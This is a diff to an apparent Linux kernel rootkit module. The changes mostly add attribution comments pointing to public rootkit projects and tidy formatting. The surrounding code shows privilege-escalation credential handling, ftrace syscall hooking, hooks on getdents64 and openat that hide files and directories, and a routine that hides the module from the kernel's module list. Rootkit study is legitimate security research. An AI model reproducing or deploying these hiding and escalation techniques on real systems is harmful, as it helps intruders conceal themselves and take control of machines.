@@ -123,6 +123,7 @@ static inline void disable_write_protection(void) {
 //======================================================================================================================
 
 //*************************************************** Util functions ***************************************************
+// These utils are taken from https://github.com/croemheld/lkm-rootkit/tree/master
 static struct data_node {
 	/* pointer to data */
 	void *data;
@@ -130,8 +131,7 @@ static struct data_node {
 	struct data_node *prev, *next;
 };
 
-static struct data_node *insert_data_node(struct data_node **head, void *data)
-{
+static struct data_node *insert_data_node(struct data_node **head, void *data) {
 	struct data_node *node = kmalloc(sizeof(struct data_node), GFP_KERNEL);
 	node->data = data;
 
@@ -154,9 +154,7 @@ static void delete_data_node(struct data_node **head, struct data_node *node) {
 	kfree(node);
 }
 
-static struct data_node *find_data_node_field(struct data_node **head, void *needle,
-	int offset, int length)
-{
+static struct data_node *find_data_node_field(struct data_node **head, void *needle, int offset, int length) {
 	struct data_node *node = *head;
 
 	while(node != NULL) {
@@ -171,6 +169,7 @@ static struct data_node *find_data_node_field(struct data_node **head, void *nee
 //======================================================================================================================
 
 //***************************************** Functions for privilage escalation *****************************************
+// A lot of these functions were adapted from https://github.com/croemheld/lkm-rootkit/tree/master
 struct task_struct *real_init;
 struct data_node *creds = NULL;
 struct cred_node {
@@ -220,8 +219,7 @@ static void init_task_disown(struct cred_node *node) {
 	write_unlock_irqrestore(&cred_lock, cred_flags);
 }
 
-static void insert_cred(struct task_struct *task)
-{
+static void insert_cred(struct task_struct *task) {
 	struct cred *pcred;
 
 	struct cred_node *cnode = kmalloc(sizeof(struct cred_node), GFP_KERNEL);
@@ -329,7 +327,7 @@ static ptregs_t orig_openat;
 //======================================================================================================================
 
 //************************************** Definitions and array for holding hooks ***************************************
-/* Note: The following hooking mechanism utilising ftrace was heavily inspired by the ftrace-hook LKM - see:
+/* Note: The following hooking mechanism utilising ftrace was used heavily from the ftrace-hook project - see:
 https://github.com/ilammy/ftrace-hook */
 static struct ftrace_hook {
     const char *name;
@@ -364,6 +362,8 @@ static struct ftrace_hook hooks[] = {
 //======================================================================================================================
 
 //************************************** Functions for installing/removing hooks ***************************************
+/* Note: The following hooking mechanism utilising ftrace was used heavily from the ftrace-hook project - see:
+https://github.com/ilammy/ftrace-hook */
 static int fh_resolve_hook_address(struct ftrace_hook *hook) {
     hook->address = kallsyms_lookup_name_fn(hook->name);
 
@@ -508,6 +508,7 @@ static int should_hide_file(const char *filename) {
 }
 
 // helper function for hooked getdents64 syscall to hide any files / dirs we want hidden
+// This is adapted from: https://github.com/ait-aecid/caraxes/
 static int __always_inline hide_files_and_dirs(struct linux_dirent __user * dirent, int res, int fd) {
 	int err;
 	unsigned long off = 0;
@@ -555,7 +556,7 @@ static int __always_inline hide_files_and_dirs(struct linux_dirent __user * dire
 	return res;
 }
 
-// Call this from inside hooked sys_getdents64
+// Can call this from inside hooked sys_getdents64 to hide files
 static void make_file_hidden(const char *path) {
     struct path file_path;
     struct inode *inode;
@@ -648,7 +649,6 @@ static void hide_module(void) {
     prev_module = THIS_MODULE->list.prev;
 
     list_del(&THIS_MODULE->list);
-    // kobject_del(&THIS_MODULE->mkobj.kobj);
     isHidden = 1;
 }
 
@@ -723,7 +723,6 @@ static asmlinkage long hook_kill(const struct pt_regs *regs) {
 static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
     unsigned int fd = regs->di;
     struct linux_dirent __user *dirent = (struct linux_dirent __user *)regs->si;
-    unsigned int count = regs->dx;
 
     int ret = orig_getdents64(regs);
     if (ret <= 0) return ret;
@@ -737,10 +736,7 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
 // Hooks the openat syscall, which is used to open / create files
 // We can hook this syscall to stop opening of files or directories we want to hide
 static asmlinkage long hook_openat(const struct pt_regs *regs) {
-    int dfd = regs->di;
     const char __user *filename = (const char __user *)regs->si;
-    int flags = regs->dx;
-    umode_t mode = regs->r10;
 
     char kernel_filename[256];
     long copied = strncpy_from_user(kernel_filename, filename, 255);
